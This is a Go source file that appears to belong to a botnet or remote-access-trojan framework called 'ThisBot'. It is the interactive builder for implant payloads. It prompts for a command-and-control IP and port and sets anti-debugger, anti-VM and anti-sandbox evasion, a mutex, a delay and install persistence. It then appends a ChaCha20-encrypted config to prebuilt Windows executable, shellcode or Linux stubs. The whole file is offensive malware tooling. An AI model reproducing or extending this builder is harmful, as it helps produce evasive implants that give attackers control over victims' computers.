package core

import (
	"ThisBot/common"
	config2 "ThisBot/config"
	"ThisBot/utils"
	"encoding/json"
	"fmt"
	"os"
	"strconv"

	"github.com/goccy/go-yaml"
)

type BuildConfig struct {
	Version      string   `json:"version" yaml:"version"`
	Host         []string `json:"host" yaml:"host"`
	Single       bool     `json:"single" yaml:"single"`
	Anti_debug   bool     `json:"anti_debug" yaml:"anti_debug"`
	Anti_vm      bool     `json:"anti_vm" yaml:"anti_vm"`
	Anti_sandbox bool     `json:"anti_sandbox" yaml:"anti_sandbox"`
	Install      bool     `json:"install" yaml:"install"`
	Install_file string   `json:"file" yaml:"file"`
	Mutex_name   string   `json:"mutex" yaml:"mutex"`
	Delay        uint     `json:"delay" yaml:"delay"`
	Use_ssl      bool     `json:"ssl" yaml:"ssl"`
}

func BuildPayload() ([]byte, string) {
	// Clean screen
	clear_handler()
	// Create configure
	config := BuildConfig{}
	config.Host = make([]string, 1)
	config.Version = common.Version
	// Show banner
	banner := `__________      .__.__       .___            
\______   \__ __|__|  |    __| _/___________ 
 |    |  _/  |  \  |  |   / __ |/ __ \_  __ \
 |    |   \  |  /  |  |__/ /_/ \  ___/|  | \/
 |______  /____/|__|____/\____ |\___  >__|   
        \/                    \/    \/`
	fmt.Println(banner)

	var command string
	if utils.FileExist(common.ConfigPayloadDefaultFileName) {
		fmt.Print("[⛏️] Load existing configure?(y/n, default is y)\nBuild> ")
		choice := utils.ReadFromIO()
		if choice != "n" && choice != "no" {
			// Read payload configure
			ymlPayloadConfig, err := os.ReadFile(common.ConfigPayloadDefaultFileName)
			if err == nil && ymlPayloadConfig != nil {
				yaml.Unmarshal(ymlPayloadConfig, &config)
				goto GenPayload
			}
		}
	}

	// C2 IP
	for {
		fmt.Print("[⛏️] Enter C2 IP(URL): \nBuild> ")
		command = utils.ReadFromIO()
		if utils.IsLegalURLOrIP(command) {
			config.Host[0] = command
			break
		}
		fmt.Println("[💀] Wrong IP(URL) format")
	}
	// C2 Port
	for {
		fmt.Print("[⛏️] Enter C2 port(0~65535): \nBuild> ")
		command = utils.ReadFromIO()
		port, err := strconv.ParseInt(command, 10, 64)
		if err != nil || (port < 0 || port > 65535) {
			fmt.Println("[💀] Wrong port(0~65535)")
			continue
		}
		config.Host[0] += fmt.Sprintf(":%d", port)
		break
	}
	// SSL setup
	fmt.Print("[⛏️] Enable SSL?(y/n, default is y)\nBuild> ")
	command = utils.ReadFromIO()
	config.Use_ssl = true
	if command == "n" || command == "no" {
		config.Use_ssl = false
	}
	// Singleton setup
	fmt.Print("[⛏️] Single instance?(y/n, default is y)\nBuild> ")
	config.Single = true
	command = utils.ReadFromIO()
	if command == "n" || command == "no" {
		config.Single = false
	}
	// Anti-Debugger
	fmt.Print("[⛏️] Enable Anti-Debugger?(y/n, default is y)\nBuild> ")
	command = utils.ReadFromIO()
	config.Anti_debug = true
	if command == "n" || command == "no" {
		config.Anti_debug = false
	}
	// Anti-VM
	fmt.Print("[⛏️] Enable Anti-VM?(y/n, default is y)\nBuild> ")
	command = utils.ReadFromIO()
	config.Anti_vm = true
	if command == "n" || command == "no" {
		config.Anti_vm = false
	}
	// Anti-Sandbox
	fmt.Print("[⛏️] Enable Anti-Sandbox?(y/n, default is y)\nBuild> ")
	command = utils.ReadFromIO()
	config.Anti_sandbox = true
	if command == "n" || command == "no" {
		config.Anti_sandbox = false
	}
	// Delay seconds
	for {
		fmt.Print("[⛏️] Delay seconds?(Must >= 0, default is 0)\nBuild> ")
		command = utils.ReadFromIO()
		config.Delay = 0
		if command != "0" && command != "" {
			delay_sec, err := strconv.ParseInt(command, 10, 64)
			if err != nil || delay_sec < 0 {
				fmt.Println("[💀] Delay seconds must be greater than 0")
				continue
			}
			config.Delay = uint(delay_sec)
		}
		break
	}
	// Generate mutex name
	config.Mutex_name = utils.RandomString(16)
	// Install payload
	fmt.Print("[⛏️] Enable install?(y/n, default is n)\nBuild> ")
	config.Install = false
	command = utils.ReadFromIO()
	if command == "y" || command == "yes" {
		config.Install = true
		// install file
		for {
			fmt.Print("[⛏️] Enter install filename(default is random name): \nBuild> ")
			command := utils.ReadFromIO()
			if command == "" {
				command = utils.RandomString(8)
			}
			break
		}
	}

	// Save or update payload.yaml config file
	fmt.Print("[⛏️] Do you wanna save the config?(y/n, default is y)\nBuild> ")
	command = utils.ReadFromIO()
	if command != "n" && command != "no" {
		// Save payload configure file
		ymlConfig, _ := yaml.Marshal(&config)
		err := os.WriteFile(common.ConfigPayloadDefaultFileName, ymlConfig, 0644)
		if err != nil {
			fmt.Println("[💀] Error writing default payload config file")
		} else {
			fmt.Println("[✅] Successfully saved default payload config file")
		}
	}
GenPayload:
	var payload []byte = nil
	var finalPath string = config2.GenerateRandom(8)
	// Payload style
	for {
		fmt.Println("[⛏️] Choose payload type(default is windows exe)\n")
		fmt.Println("1. Windows Executable\n2. Windows Shellcode\n3. Linux Executable\n4. Others quit builder")
		fmt.Print("Build> ")
		command = utils.ReadFromIO()
		cmd, err := strconv.ParseInt(command, 10, 64)
		if err != nil {
			fmt.Println("[💀] Wrong command, please try again")
			continue
		}
		switch cmd {
		case 1:
			finalPath += ".exe"
			payload, err = utils.ReadBinary(common.StubPath["winexe"] + ".exe")
			break
		case 2:
			finalPath += ".bin"
			payload, err = utils.ReadBinary(common.StubPath["winshellcode"] + ".bin")
			break
		case 3:
			payload, err = utils.ReadBinary(common.StubPath["linux"])
			break
		default:
			return nil, ""
		}
		if err != nil || payload == nil {
			return nil, ""
		}
		break
	}

	// Generate payload
	bytesConfig, _ := json.Marshal(&config)
	key := utils.GenerateRandomBytes(32)
	cipher_config := common.EncChacha20(key, bytesConfig)
	if cipher_config == nil || key == nil {
		fmt.Println("[💀] Failed to generate encrypted config")
		return nil, ""
	}

	// | Payload(n) | key(32) | encrypted_config(n) | encrypted_config_size(4) |
	payload = append(payload, key...)
	payload = append(payload, cipher_config...)
	var size int = len(cipher_config)
	bytSize := utils.IntToBytes(size)
	payload = append(payload, bytSize...)

	return payload, finalPath
}
